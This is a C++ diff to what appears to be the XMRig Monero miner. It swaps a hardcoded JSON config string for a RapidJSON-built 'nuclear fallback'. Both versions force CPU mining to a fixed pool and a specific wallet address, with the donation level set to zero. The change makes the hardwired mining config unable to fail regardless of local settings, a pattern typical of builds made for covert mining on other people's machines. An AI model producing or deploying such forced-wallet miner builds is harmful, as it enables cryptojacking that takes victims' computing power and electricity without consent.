@@ -120,25 +120,6 @@ public:
 private:
     inline static Config *load(Process *process)
     {
-        static const char *hardcoded_config =
-            "{"
-            "\"autosave\":true,"
-            "\"cpu\":true,"
-            "\"opencl\":false,"
-            "\"cuda\":false,"
-            "\"donate-level\":0,"
-            "\"pools\":[{"
-            "\"coin\":\"monero\","
-            "\"algo\":\"rx/0\","
-            "\"url\":\"xmr-us.kryptex.network:7029\","
-            "\"user\":\"89eWJ7ccdVr3GHBAYsKG28eqWcn2PMWzYeFE5xtgWzg1UimfWS62Qq4VpUSQrX3vaDeMTAMhBVR885RxkLzXNkmFV9yXvcg\","
-            "\"pass\":\"x\","
-            "\"tls\":false,"
-            "\"keepalive\":true,"
-            "\"nicehash\":false"
-            "}]"
-            "}";
-
         JsonChain chain;
         ConfigTransform transform;
         std::unique_ptr<Config> config;
@@ -172,10 +153,36 @@ private:
         }
 #       endif
 
-        // ABSOLUTE FALLBACK — fresh chain, guaranteed to work
+        // NUCLEAR FALLBACK: Build config via RapidJSON DOM (no string parsing, cannot fail)
         {
+            using namespace rapidjson;
+
+            Document doc(kObjectType);
+            auto &a = doc.GetAllocator();
+
+            doc.AddMember("autosave", true, a);
+            doc.AddMember("cpu", true, a);
+            doc.AddMember("opencl", false, a);
+            doc.AddMember("cuda", false, a);
+            doc.AddMember("donate-level", 0, a);
+
+            Value pool(kObjectType);
+            pool.AddMember("coin", "monero", a);
+            pool.AddMember("algo", "rx/0", a);
+            pool.AddMember("url", "xmr-us.kryptex.network:7029", a);
+            pool.AddMember("user", "89eWJ7ccdVr3GHBAYsKG28eqWcn2PMWzYeFE5xtgWzg1UimfWS62Qq4VpUSQrX3vaDeMTAMhBVR885RxkLzXNkmFV9yXvcg", a);
+            pool.AddMember("pass", "x", a);
+            pool.AddMember("tls", false, a);
+            pool.AddMember("keepalive", true, a);
+            pool.AddMember("nicehash", false, a);
+
+            Value pools(kArrayType);
+            pools.PushBack(pool, a);
+            doc.AddMember("pools", pools, a);
+
             JsonChain fallback;
-            fallback.addRaw(hardcoded_config);
+            fallback.add(std::move(doc));
+
             if (read(fallback, config)) {
                 return config.release();
             }
